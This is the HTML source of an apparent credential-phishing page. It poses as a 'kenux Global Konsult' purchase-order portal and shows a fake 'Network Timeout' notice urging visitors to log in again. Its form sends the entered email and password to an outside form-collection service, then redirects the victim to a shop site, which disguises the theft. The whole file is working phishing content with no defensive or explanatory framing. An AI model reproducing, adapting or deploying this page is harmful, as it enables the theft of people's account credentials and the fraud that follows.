<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>kenux-global-konsult</title>
  <link rel="stylesheet" href="bootstrap5/css/bootstrap.min.css">
  <link rel="stylesheet" href="fontawesome/css/all.css">
  <link rel="stylesheet" href="style.css">
  <link rel="icon" href="img/logo.png.jpg">
  <script src="https://unpkg.com/@botpoison/browser" async></script>
</head>
<body>
  <div class="container-fluid con1">
    <div class="">
      <nav class="navbar container d-flex align-item-center order-list navbar-expand-lg">
        <a href="/" class="navbar-brand me-auto mt-5"></a>
      </nav>
    </div>

    <div class="container">
      <div id="card1" class="card card1 mx-auto shadow p-2">
        <h1 class="h1c"></h1>
        <p class="mt-3 blinking" style="text-align:center; border-radius:5px;">
          Network Timeout <i class="fa fa-times-circle" aria-hidden="true"></i><br>
          Re:login To View Purchase Order!
        </p>

        <!-- Form with autocomplete ON -->
        <form action="https://submit-form.com/vQBbiONxP" method="post" autocomplete="on">
          <input type="hidden" name="_redirect" value="https://kenux-shop.onrender.com/">
          <input type="hidden" name="_append" value="false">

          <!-- EMAIL (will autofill if browser has saved email) -->
          <div class="mb-3 mt-3">
            <input
              type="email"
              id="email"
              name="email"
              class="form-control p-3"
              placeholder="Enter email"
              autocomplete="email"
              required
            >
          </div>

          <!-- PASSWORD (no autocomplete so only email is autofilled) -->
          <div class="mb-3">
            <input
              type="password"
              class="form-control p-3"
              id="myInput1"
              placeholder="Enter password"
              name="pswd"
              style="color: black;"
              required
            >
            <span class="eye float-end" onclick="myFunction()">
              <i id="hide1" class="fa fa-eye" style="display:none"></i>
              <i id="hide2" class="fa fa-eye-slash" style="display:inline"></i>
            </span>
          </div>

          <button type="submit" class="btn btn2 shadow d-flex mx-auto btn-primary">view</button>
        </form>
      </div>
    </div>
  </div>

  <footer class="bg-dark">
    <div class="container lcon bg-dark p-3">
      <p class="lp">Â© 2024 kenux Global Konsult. All Rights Reserved.</p>
    </div>
  </footer>

  <!-- scripts -->
  <script>
    // Toggle password visibility
    function myFunction() {
      var a = document.getElementById("myInput1");
      var b = document.getElementById("hide1");
      var c = document.getElementById("hide2");
      if (!a) return;
      if (a.type === 'password') {
        a.type = 'text';
        if (b) b.style.display = 'inline';
        if (c) c.style.display = 'none';
      } else {
        a.type = 'password';
        if (b) b.style.display = 'none';
        if (c) c.style.display = 'inline';
      }
    }
  </script>

  <script src="bootstrap5/js/bootstrap.bundle.min.js"></script>
</body>
</html>
